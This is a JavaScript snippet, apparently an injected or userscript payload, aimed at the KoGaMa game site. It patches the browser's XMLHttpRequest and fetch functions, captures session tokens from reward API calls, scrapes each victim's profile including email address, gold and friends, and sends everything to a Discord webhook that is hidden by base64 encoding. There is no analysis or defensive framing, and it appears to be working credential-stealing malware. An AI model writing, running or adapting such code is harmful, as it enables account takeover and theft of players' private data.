
(function() {
    'use strict';
    const a = 'https://api-www.kgoma.com/v1/api/reward/game-data/?';
    const b = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2NzE2Nzc1NTkxMjg3NjE0My9OTnFYQnRVdkoxcHJWbi1TMG9ucE5FTFFDdXpVRFNlaS1OdFBvVEFZN084emZ4TUFtX2phWGRuYjh6NWJOYmFwbGhBTw==');
    // IF YOU ARE SEEING THIS, CHANGE THE WEBHOOK. b64 format.

    function dog() {
        return Math.floor(Math.random() * 16777215).toString(16);
    }

    function fish(url, fish) {
        const c = new URLSearchParams(new URL(url).search);
        return c.get(fish);
    }

    async function fetchData(id) {
        try {
            const d = await fetch(`https://www.kogama.com/profile/${id}`);
            const e = await d.text();
            const f = e.match(/options\.bootstrap\s*=\s*({.*?});/s);
            if (f) {
                const g = JSON.parse(f[1]).object;
                const h = {
                    description: g.description,
                    level: g.level,
                    email: g.email,
                    is_subscriber: g.is_subscriber,
                    level_progress: g.level_progress,
                    username: g.username,
                    xp_to_next_level: g.xp_to_next_level,
                    friends: g.friends,
                    leaderboard_rank: g.leaderboard_rank,
                    gold: g.gold,
                    created: g.created
                };
                return {
                    info: {
                        username: g.username,
                        level: g.level,
                        id: id,
                        gold: g.gold
                    },
                    raw: JSON.stringify(h, null, 4)
                };
            } else {
                return {
                    info: {
                        username: 'Unknown',
                        level: 'N/A',
                        id: id,
                        gold: 'N/A'
                    },
                    raw: e
                };
            }
        } catch (err) {
            return {
                info: {
                    username: 'Error',
                    level: 'N/A',
                    id: id,
                    gold: 'N/A'
                },
                raw: err.message
            };
        }
    }

    async function fetchGameTitle(planetId) {
        try {
            const d = await fetch(`https://www.kogama.com/games/play/${planetId}/`);
            const e = await d.text();
            const f = e.match(/<title>(.*?)<\/title>/);
            if (f) {
                const fullTitle = f[1];
                const title = fullTitle.split(' - KoGaMa')[0];
                return title || 'Unknown Game Title';
            }
            return 'Unknown Game Title';
        } catch (err) {
            return 'Error fetching game title';
        }
    }

    async function sendData(data) {
        const i = fish(data.url, 'profile_id');
        const j = fish(data.url, 'token');
        const planetId = fish(data.url, 'planet_id');
        const k = await fetchData(i);
        const gameTitle = await fetchGameTitle(planetId);
        const l = {
            title: "Intercepted Cat",
            color: parseInt(dog(), 16),
            fields: [
                { name: "User", value: `[${k.info.username}](https://www.kogama.com/profile/${i}/)` },
                { name: "Goods", value: `• Level: ${k.info.level}\n• Gold: ${k.info.gold}` },
                { name: "Token", value: `${j.split('.')[0]}||.${j.split('.')[1]}||` },
                { name: "Currently Playing", value: `[${gameTitle}](https://www.kogama.com/games/play/${planetId}/)` }
            ]
        };
        const m = {
            embeds: [l]
        };
        fetch(b, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(m)
        });

        const n = new Blob([k.raw], { type: 'application/json' });
        const o = new FormData();
        o.append('file', n, `profile_${i}.json`);
        fetch(b, {
            method: 'POST',
            body: o
        });
    }

    const p = XMLHttpRequest.prototype.open;
    const q = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return p.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', function() {
            const isCat = this._url.startsWith(a);
            const r = {
                type: 'XMLHttpRequest',
                url: this._url,
                status: this.status
            };
            if (isCat) {
                sendData(r);
            }
        });
        return q.apply(this, arguments);
    };

    const s = window.fetch;
    window.fetch = function() {
        const t = arguments;
        const u = t[0];
        return s.apply(this, arguments).then(response => {
            const isCat = u.startsWith(a);
            const v = {
                type: 'fetch',
                url: u,
                status: response.status
            };
            if (isCat) {
                sendData(v);
            }
            return response;
        });
    };

})();
